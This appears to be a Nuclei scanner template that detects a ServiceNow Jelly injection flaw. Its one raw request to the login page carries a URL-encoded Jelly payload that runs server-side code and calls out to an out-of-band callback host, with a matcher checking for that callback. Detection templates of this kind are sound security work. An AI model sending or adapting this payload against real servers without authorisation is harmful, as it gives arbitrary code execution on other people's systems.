id: service-now-jelly-injection

info:
  name: ServiceNow Jelly Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects ServiceNow Jelly injection vulnerability via OAST techniques. 
    The injection allows for arbitrary code execution on the server. 

http:
  - raw:
      - |
        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Evar%20HttpClient%20=%20Packages.org.apache.commons.httpclient.HttpClient%3Bvar%20GetMethod%20=%20Packages.org.apache.commons.httpclient.methods.GetMethod%3Bvar%20client%20=%20new%20HttpClient()%3Bvar%20method%20=%20new%20GetMethod('http://{{interactsh-url}}')%3Bclient.executeMethod(method)%3B%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
        Host: {{Hostname}}
        Cookie: glide_user_route=glide.9575287a0a5ffc7d476fc5bccfdb7822; __CJ_g_startTime=%221721048818227%22; JSESSIONID=43CF7A54C5152D069B7090ACB4180B05; glide_node_id_for_js=ae0558eee75ab472e5feff3fccc0eca37100b26f225c01757d1bd1750dc9125a
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: same-origin
        Sec-Fetch-Site: same-origin
        Priority: u=4
        Cache-Control: max-age=0
        Te: trailers
        Connection: keep-alive

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
